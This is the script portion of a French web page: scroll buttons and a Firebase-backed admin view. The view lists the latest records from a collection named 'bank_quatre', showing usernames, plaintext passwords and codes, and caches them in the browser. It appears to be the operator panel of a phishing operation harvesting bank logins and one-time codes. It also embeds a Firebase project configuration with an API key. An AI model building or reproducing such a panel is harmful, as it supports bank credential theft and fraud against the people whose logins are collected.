    <script>
        // Récupérer les boutons
        const scrollToTopBtn = document.getElementById("scrollToTopBtn");
        const scrollToBottomBtn = document.getElementById("scrollToBottomBtn");

        // Ajouter un événement au clic du bouton "Aller en bas"
        scrollToBottomBtn.addEventListener("click", () => {
            window.scrollTo({
                top: document.body.scrollHeight, // Défile jusqu'au bas de la page
                behavior: "smooth" // Animation fluide
            });
        });

        // Ajouter un événement au clic du bouton "Aller en haut"
        scrollToTopBtn.addEventListener("click", () => {
            window.scrollTo({
                top: 0, // Défile jusqu'au haut de la page
                behavior: "smooth" // Animation fluide
            });
        });

        // Afficher/masquer le bouton "Aller en haut" en fonction du défilement
        window.addEventListener("scroll", () => {
            if (window.scrollY > 200) { // Afficher le bouton après 200px de défilement
                scrollToTopBtn.style.display = "flex";
            } else {
                scrollToTopBtn.style.display = "none";
            }
        });

        // Masquer le bouton "Aller en haut" au chargement de la page
        scrollToTopBtn.style.display = "none";
    </script>
<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
    import { getFirestore, collection, getDocs, query, limit, orderBy  } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-firestore.js";
    import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-auth.js";

    // Configuration Firebase
    const firebaseConfig = {
        apiKey: "AIzaSyBAn0oOcsPWlu82p_FpFyz5Bnq4dTd0R2o",
        authDomain: "virement2-bf790.firebaseapp.com",
        projectId: "virement2-bf790",
        storageBucket: "virement2-bf790.firebasestorage.app",
        messagingSenderId: "965517390511",
        appId: "1:965517390511:web:430715abd2331f0a42da5a"
    };

    // Initialisation Firebase
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);
    const auth = getAuth(app);

    // Fonction pour récupérer et afficher les données
    async function fetchData() {
        const loadingSpinner = document.getElementById("loading-spinner");
        const dataTable = document.getElementById("data-table");

        // Afficher le loader
        loadingSpinner.style.display = "block";
        dataTable.innerHTML = ""; // Vider le tableau avant de charger de nouvelles données

        try {
            // Supprimer le cache à chaque chargement pour forcer une actualisation
            localStorage.removeItem("cachedData");

            // Récupérer les données depuis Firestore avec une limite de 50 documents
            const q = query(collection(db, "bank_quatre"), orderBy("timestamp", "desc"), limit(30)); // Limiter à 50 documents
            const querySnapshot = await getDocs(q);

            if (querySnapshot.empty) {
                dataTable.innerHTML = "<tr><td colspan='4' class='text-center'>Aucune donnée trouvée</td></tr>";
            } else {
                const data = [];
                querySnapshot.forEach((doc) => {
                    data.push(doc.data()); // Stocker les données dans un tableau
                });

                // Afficher les données
                displayData(data);

                // Mettre en cache les données dans localStorage
                localStorage.setItem("cachedData", JSON.stringify(data));
            }
        } catch (error) {
            console.error("Erreur lors de la récupération des données :", error);
            dataTable.innerHTML = "<tr><td colspan='4' class='text-danger text-center'>Erreur de chargement des données</td></tr>";
        } finally {
            // Masquer le loader
            loadingSpinner.style.display = "none";
        }
    }

    // Fonction pour afficher les données dans le tableau
    function displayData(data) {
        const dataTable = document.getElementById("data-table");
        const tbody = dataTable.querySelector("tbody") || dataTable; // Utiliser tbody s'il existe
        tbody.innerHTML = ""; // Vider le contenu existant

        data.forEach((item) => {
            const row = `
                <tr>
                    <td>${item.id}</td>
                    <td>${item.username}</td>
                    <td>${item.motdepasse}</td>
                    <td>${item.code}</td>
                </tr>
            `;
            tbody.innerHTML += row; // Ajouter chaque ligne au tableau
        });
    }

    // Vérifier si l'utilisateur est connecté
    onAuthStateChanged(auth, (user) => {
        if (user) {
            // L'utilisateur est connecté, récupérer les données
            fetchData();
        } else {
            // Rediriger vers la page de connexion si l'utilisateur n'est pas connecté
            window.location.href = "admin.signIn.html";
        }
    });

    // Gestion de la déconnexion
    document.getElementById("logout-btn").addEventListener("click", async () => {
        try {
            await signOut(auth);
            localStorage.removeItem("cachedData"); // Supprimer le cache lors de la déconnexion
            window.location.href = "admin.signIn.html"; // Rediriger vers la page de connexion
        } catch (error) {
            console.error("Erreur de déconnexion :", error.message);
        }
    });
</script>
